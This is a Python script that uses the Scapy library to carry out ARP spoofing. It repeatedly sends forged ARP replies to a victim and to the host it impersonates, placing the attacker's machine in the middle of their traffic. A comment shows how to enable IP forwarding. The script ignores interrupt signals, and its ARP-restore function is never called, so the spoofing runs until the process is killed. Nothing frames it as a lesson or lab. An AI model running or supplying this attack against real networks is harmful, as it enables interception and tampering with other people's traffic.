from scapy.layers.l2 import ARP, Ether
from scapy.all import sendp
import os
import time
import signal


# Ensure that you have IP forwarding on the attacker machine (Linux example)
# os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def spoof_arp(target_ip, target_mac, spoof_ip, attacker_mac):
  # Send an ARP reply to `target_ip`, telling it that `spoof_ip`
  # is associated with the attacker's MAC address.

  # Create an Ethernet frame with the correct target MAC address
  ether = Ether(src=attacker_mac, dst=target_mac)
  # Create the ARP packet
  arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
  # Send combined Ethernet + ARP packet
  packet = ether / arp
  sendp(packet, verbose=False)

def restore_arp(target_ip, target_mac, source_ip, source_mac, attacker_mac):
  # Restore the ARP table for `target_ip`, telling it that `source_ip`
  # is associated with `source_mac`.

  ether = Ether(src=attacker_mac, dst=target_mac)
  arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
  packet = ether / arp
  sendp(packet, count=5, verbose=False)


# Spaghetti code. Will do *args on this ...
def main(in_victim_ip, in_victim_mac, in_spoofed_ip_origin, in_spoofed_mac_origin, in_attacker_mac):

  ## Oh boy ...
  signal.signal(signal.SIGINT, signal.SIG_IGN)

  print(f"Starting ARP spoofing as {in_spoofed_ip_origin} for victim {in_victim_ip}...")
  while True:
    # Tell the victim that the spoofed IP is at the attacker's MAC
    spoof_arp(in_victim_ip, in_victim_mac, in_spoofed_ip_origin, in_attacker_mac)
    # Tell the machine we spoof that the victim is at the attacker's MAC
    spoof_arp(in_spoofed_ip_origin, in_spoofed_mac_origin, in_victim_ip, in_attacker_mac)
    time.sleep(2)  # Repeat every 2 seconds to maintain the MITM position

if __name__ == "__main__":
  ## Args here are defaulted to dummies so a native run of the script can be possible having these changed
  main(in_victim_ip="192.168.235", in_victim_mac="ff:ff:ff:ff:ff:ff", in_spoofed_ip_origin="192.168.10.1",
       in_spoofed_mac_origin="ff:ff:ff:ff:ff:ff", in_attacker_mac="00:00:00:00:00:00")